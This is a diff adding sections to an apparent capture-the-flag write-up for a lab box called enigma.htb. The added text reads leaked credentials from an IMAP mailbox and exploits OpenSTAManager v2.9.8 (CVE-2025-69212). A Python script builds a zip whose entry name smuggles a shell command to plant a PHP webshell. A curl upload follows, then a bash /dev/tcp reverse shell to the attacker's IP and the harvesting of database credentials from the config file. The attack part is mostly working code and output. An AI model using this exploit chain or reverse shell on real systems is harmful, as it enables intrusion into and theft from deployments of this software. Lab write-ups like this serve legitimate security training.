@@ -131,4 +131,109 @@ Inside the inbox, there's a single email from sarah@enigma.htb. Since we already
 curl -ks --user 'sarah:<redacted>' 'imaps://<IP ADDRESS>/INBOX'
 * LIST (\HasNoChildren) "/" INBOX
 ```
-The login succeeds, confirming password reuse.  
+The login succeeds, confirming password reuse. Fetching the message via IMAP:  
+```
+curl -ks --user 'sarah:<redacted>' 'imaps://<IP ADDRESS>/INBOX;UID=*'
+Return-Path: <it@enigma.htb>
+X-Original-To: sarah@localhost
+Delivered-To: sarah@localhost
+Received: from enigma (localhost [127.0.0.1])
+        by enigma (Postfix) with ESMTP id C123C211B9
+        for <sarah@localhost>; Wed, 18 Feb 2026 21:42:51 +0000 (UTC)
+Date: Thu, 19 Feb 2026 10:22:00 +0000
+Subject: Re: OpenSTAManager Access Request
+From: it@enigma.htb
+To: sarah@enigma.htb
+Message-Id: <osm-reply-001@enigma.htb>
+In-Reply-To: <osm-request-001@enigma.htb>
+References: <osm-request-001@enigma.htb>
+
+Hi Sarah,
+
+Apologies for the delay. I have provisioned your access. Please find the
+details below:
+
+URL: http://support_001.enigma.htb
+Username: <redacted>
+Password: <redacted>
+
+Note: I will create a dedicated account for you shortly, for now you can
+use the admin account to get started.
+
+Regards,
+IT Support
+Enigma Corp
+```
+This reveals a third virtual host along with credentials for what appears to be an internal support application. We add the host entry:
+
+### Identifying the Vulnerability  
+Logging in with the leaked credentials, the application turns out to be OpenSTAManager v2.9.8, which is vulnerable to CVE-2025-69212, a known flaw allowing remote code execution via a crafted upload.  
+``` echo '<IP ADDRESS>    support_001.enigma.htb' | sudo tee -a /etc/hosts ```
+
+References:  
+[NVD - CVE-2025-69212  ](https://nvd.nist.gov/vuln/detail/CVE-2025-69212)
+[GitHub Advisory - GHSA-25fp-8w8p-mx36](https://github.com/advisories/GHSA-25fp-8w8p-mx36)  
+
+### Building the Malicious Archive  
+The vulnerability is triggered through a specially crafted .zip archive whose internal filename smuggles a shell command, which gets executed when the archive is processed by the application. We abuse this to drop a PHP webshell inside the application's files directory:  
+```
+python3 - <<'PY'
+import zipfile
+
+cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
+name = f'invoice.p7m";{cmd};echo ".p7m'
+
+with zipfile.ZipFile('/tmp/exploit.zip', 'w') as z:
+    z.writestr(name, b'DUMMY_P7M_CONTENT')
+
+print('/tmp/exploit.zip created')
+PY
+```
+The crafted entry name is structured to break out of the expected filename format, inject our echo command to write a PHP webshell (SHELL.php) into the files/ directory, and then close the string cleanly with .p7m so the application's filename parsing doesn't choke on it.  
+
+### Uploading the Malicious Archive  
+We upload the crafted archive either through the web interface or directly via curl, using a valid authenticated session cookie:  
+```
+curl -i -b 'PHPSESSID=<redacted>' \
+  -F 'op=save' \
+  -F 'id_module=14' \
+  -F 'id_plugin=48' \
+  -F 'blob1=@/tmp/exploit.zip;type=application/zip' \
+  'http://support_001.enigma.htb/actions.php'
+```
+We test the webshell by executing a simple id command:   
+```
+curl -s 'http://support_001.enigma.htb/files/SHELL.php?c=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+The webshell has been successfully written and we have remote code execution as www-data.  
+
+### Catching a Reverse Shell  
+We set up a listener on our attacking machine:  
+``` nc -lvnp 4444 ```
+Then trigger the webshell to send a reverse shell back to us:  
+``` curl -G 'http://support_001.enigma.htb/files/SHELL.php' --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/<IP Address>/4444 0>&1"' ```
+Once the connection lands, we upgrade to a fully interactive TTY:  
+``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```
+
+### Loot: Database Credentials  
+Inspecting the application's configuration file, /var/www/html/openstamanager/config.inc.php, we find hardcoded database credentials:  
+```
+// Impostazioni di base per l'accesso al database
+$db_host = 'localhost';
+$db_username = '<redacted>';
+$db_password = '<redacted>';
+$db_name = 'openstamanager';
+// $port = '|port|';
+$db_options = [
+    // 'sort_buffer_size' => '2M',
+];
+```
+
+
+
+
+
+
+
+
